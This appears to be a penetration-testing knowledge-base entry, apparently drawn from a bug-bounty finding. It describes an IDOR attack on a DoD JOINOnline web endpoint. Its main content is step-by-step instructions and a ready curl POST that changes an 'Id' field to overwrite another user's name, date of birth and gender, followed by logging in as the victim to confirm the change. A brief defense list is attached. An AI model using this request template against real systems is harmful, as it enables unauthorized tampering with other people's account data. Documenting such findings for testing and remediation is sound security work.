---
id: proc-dod-submit-modified-request
tags:
  - submit
  - exploit
  - idor
  - dod
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Privilege Escalation]]'
commands:
  - '[[commands/Submit-DoD-IDOR-Profile-Update]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
updated_at: '2025-12-14T17:25:33.743Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[Valid Accounts]]'
---
# Submit-Modified-Request-to-Update-Target-Profile

## Summary

This procedure forwards the modified POST request to the DoD JOINOnline endpoint, successfully overwriting the target user's biographical details via IDOR, and verifies the impact.

## Description

After modifying the 'Id' parameter, submit the request to /JOINOnline/Board/SubmitDoc using the proxy tool. The server processes it without checks, updating User-B's profile with data like name="Test", DOB="12/12/2001", gender="Male". Log in as User-B to confirm changes. This demonstrates data tampering. Prerequisites: Modified request with valid token/cookies. Expected outcome: Target profile altered, confirming vulnerability.

## Requirements

1. Modified POST request in proxy
2. Valid authentication cookies for the session
3. Access to target account for verification

## Defense

Defensive measures and detection strategies:

- Audit logs for profile changes and correlate with authenticated user
- Implement role-based access control (RBAC) for profile endpoints
- Monitor for successful updates from mismatched user contexts

## Objectives

1. Execute unauthorized profile modification
2. Achieve data tampering on target account
3. Validate exploitation through post-update inspection

## Instructions

### Step 1: Forward Modified Request

**Context**: Submit the tampered request to trigger the update.

**Command** ([[commands/Submit-DoD-IDOR-Profile-Update]]):

Use Burp Repeater to send the modified POST, or replicate with curl:

```bash
curl -X POST https://www.████████/JOINOnline/Board/SubmitDoc \
  -H "Cookie: {YOUR-COOKIES}" \
  -F "UserId=10268" \
  -F "Id=1327" \
  -F "BoardId=1021" \
  -F "que2800=Test" \
  -F "que2804=12/12/2001" \
  -F "que2807=Male" \
  -F "__RequestVerificationToken={VERIFICATION-TOKEN}"
```

> Expected output: HTTP 200 or success response, no error on ID mismatch.

### Step 2: Verify Target Profile Changes

**Context**: Log in as target to confirm impact.

No command; use browser to log in as User-B and check Biographical-Info.

> Profile shows updated data (e.g., name=Test). Expected output: Altered details visible.

## MITRE ATT&CK Mapping

### Tactics

- [[Privilege Escalation]] Privilege Escalation

### Techniques

- [[Valid Accounts]] Valid Accounts

### Sub-Techniques


## Commands Used

- [[commands/Submit-DoD-IDOR-Profile-Update]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- [[submit]]
- [[exploit]]
- [[idor]]
- [[dod]]
